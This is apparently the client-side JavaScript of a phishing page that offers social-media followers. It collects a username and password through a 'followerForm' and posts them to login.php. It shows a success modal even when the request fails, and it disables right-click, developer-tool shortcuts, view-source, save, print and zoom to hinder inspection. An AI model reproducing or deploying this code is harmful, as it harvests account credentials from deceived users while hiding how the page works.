document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('followerForm');
    const submitBtn = document.querySelector('.submit-btn');
    const btnContent = document.querySelector('.btn-content');
    const btnLoader = document.querySelector('.btn-loader');
    const togglePassword = document.querySelector('.toggle-password');
    const passwordInput = document.querySelector('input[type="password"]');
    const followerCards = document.querySelectorAll('.follower-card');
    const successModal = document.getElementById('successModal');
    const closeModalBtn = document.getElementById('closeModal');

    console.log('Modal element:', successModal);

    togglePassword.addEventListener('click', function() {
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            togglePassword.classList.replace('fa-eye', 'fa-eye-slash');
        } else {
            passwordInput.type = 'password';
            togglePassword.classList.replace('fa-eye-slash', 'fa-eye');
        }
    });

    followerCards.forEach(card => {
        card.addEventListener('click', function() {
            followerCards.forEach(c => c.classList.remove('selected'));
            this.classList.add('selected');
            const radio = this.querySelector('input[type="radio"]');
            radio.checked = true;
        });
    });

    closeModalBtn.addEventListener('click', function() {
        if (successModal) {
            successModal.classList.add('hidden');
            successModal.style.display = 'none';
        }
    });

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        btnContent.classList.add('hidden');
        btnLoader.classList.add('active');
        submitBtn.disabled = true;

        const formData = new FormData(form);

        fetch('login.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            btnContent.classList.remove('hidden');
            btnLoader.classList.remove('active');
            submitBtn.disabled = false;
            if (successModal) {
                successModal.classList.remove('hidden');
                successModal.style.display = 'flex';
                console.log('Modal displayed');
            }
            form.reset();
            followerCards.forEach(c => c.classList.remove('selected'));
        })
        .catch(error => {
            console.error('Error:', error);
            btnContent.classList.remove('hidden');
            btnLoader.classList.remove('active');
            submitBtn.disabled = false;
            if (successModal) {
                successModal.classList.remove('hidden');
                successModal.style.display = 'flex';
                console.log('Modal displayed on error');
            }
            form.reset();
            followerCards.forEach(c => c.classList.remove('selected'));
        });
    });
});

document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
});

document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'I') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'J') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key === 'U') {
        e.preventDefault();
        return false;
    }
    if (e.key === 'F12') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key === 'S') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.key === 'S') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key === 'p') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key === 'P') {
        e.preventDefault();
        return false;
    }
    if (e.metaKey && e.key === 'Option') {
        e.preventDefault();
        return false;
    }
    if (e.metaKey && e.key === 'I') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key === '+') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key === '-') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.key === '0') {
        e.preventDefault();
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.key === '?') {
        e.preventDefault();
        return false;
    }
});

document.addEventListener('wheel', function(e) {
    if (e.ctrlKey) {
        e.preventDefault();
        return false;
    }
}, { passive: false });
